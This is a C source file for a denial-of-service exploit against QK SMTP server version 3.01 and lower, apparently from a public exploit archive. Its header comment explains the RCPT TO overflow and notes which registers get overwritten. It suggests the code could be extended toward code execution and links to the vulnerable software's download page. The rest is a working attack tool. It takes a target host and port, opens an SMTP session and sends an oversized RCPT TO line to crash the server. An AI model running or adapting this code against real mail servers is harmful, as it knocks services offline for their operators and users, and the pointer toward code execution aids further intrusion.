/*
=============================================================
0-day RCPT TO DoS Exploit for QK SMTP version 3.01 and lower.
=============================================================
Exploit affects a format string error in the RCPT TO command
in which the program attempts to print out the string back
to the console screen of the application. (RCPT TO: %s)
This PoC code could possibly be re-written to allow buffer
overflow and execution of code. (I unfortanetly lack time at
the moment to continue any more reasarch and development)

EIP, EBP, ESI and EAX can be overwritten with buffer code
but the program formats it in Unicode. Results can be similar
to this:
Buffer = "A"
EIP = 00400040
EBP = 00400040
ESI = 00400040

QK SMTP 3.01 is available here:
http://www.qksoft.com/qk-smtp-server/download.html
and at various shareware download sites across the internet.
Google "FREE SMTP" and it should pop up quickly

This was quickly compiled in LCC-Win32 (Free C++ compiler and IDE)
- Greg Linares
Questions/Comments/Etc --> GLinares.code [at] gmail [dot] com
*/



#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>

#pragma comment(lib,"wsock32.lib")

int main(int argc, char *argv[])
{
static char overflow[65000];
static char buff2[65000];
WSADATA wsaData;


struct hostent *hp;
struct sockaddr_in sockin;
char buf[300], *check;
int sockfd, bytes;
int i;
char *hostname;
unsigned short port;

if (argc <= 1)
   {
	  printf("QK SMTP <= 3.01 DoS RCPT TO: Overflow\n");
	  printf("By: Greg Linares (glinares.code [at ] gmail [dot] com)\n\n");
      printf("Usage: %s [hostname] [port]\n", argv[0]);
      printf("default port is 25 \n");

      exit(0);
   }


hostname = argv[1];
if (argv[2]) port = atoi(argv[2]);
else port = atoi("25");

if (WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
   {
      fprintf(stderr, "Error setting up with WinSock v1.1\n");
      exit(-1);
   }


   hp = gethostbyname(hostname);
   if (hp == NULL)
   {
      printf("ERROR: Uknown host %s\n", hostname);
	  printf("%s",hostname);
      exit(-1);
   }

   sockin.sin_family = hp->h_addrtype;
   sockin.sin_port = htons(port);
   sockin.sin_addr = *((struct in_addr *)hp->h_addr);

   if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   {
      printf("ERROR: Socket Error\n");
      exit(-1);
   }

   if ((connect(sockfd, (struct sockaddr *) &sockin,
                sizeof(sockin))) == SOCKET_ERROR)
   {
      printf("ERROR: Connect Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }

   printf("Connected to [%s] on port [%d], sending overflow....\n",
          hostname, port);


   if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
   {
      printf("ERROR: Recv Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(1);
   }

   /* wait for SMTP service welcome*/
   buf[bytes] = '\0';
   check = strstr(buf, "2");
   if (check == NULL)
   {
      printf("ERROR: NO  response from SMTP service\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }

   static char Exp1[65000];
   memset(Exp1, 0, 4096);
   char Exp[] = "RCPT TO: ";
   char tail[] = "@a.com>\r\n";
   char A[] = "A";
   memset(overflow, 0, 65000);
   memset(buff2, 0, 100);
   for (i=0; i<100; i++)
	{
	   strcat(buff2, "A");
	}

   char EHLO[] = "EHLO \r\n";
   char MF[] = "MAIL FROM: <HI@";
 	strcat(overflow, MF);
	strcat(overflow, buff2);
	strcat(overflow, tail);



   send(sockfd, EHLO, strlen(EHLO), 0);
	Sleep(500);
	send(sockfd, overflow, strlen(overflow),0);
	Sleep(1000);
	strcat(Exp1, Exp);
	for (i=0; i<4096; i++){
		strcat(Exp1, A);
	}
	strcat(Exp1, tail);
	printf("%s", Exp1);
	send(sockfd, Exp1, strlen(Exp1),0);
	Sleep(2000);
    printf("Overflow Packet Sent Successfully...\n");
	closesocket(sockfd);
   WSACleanup();
 }
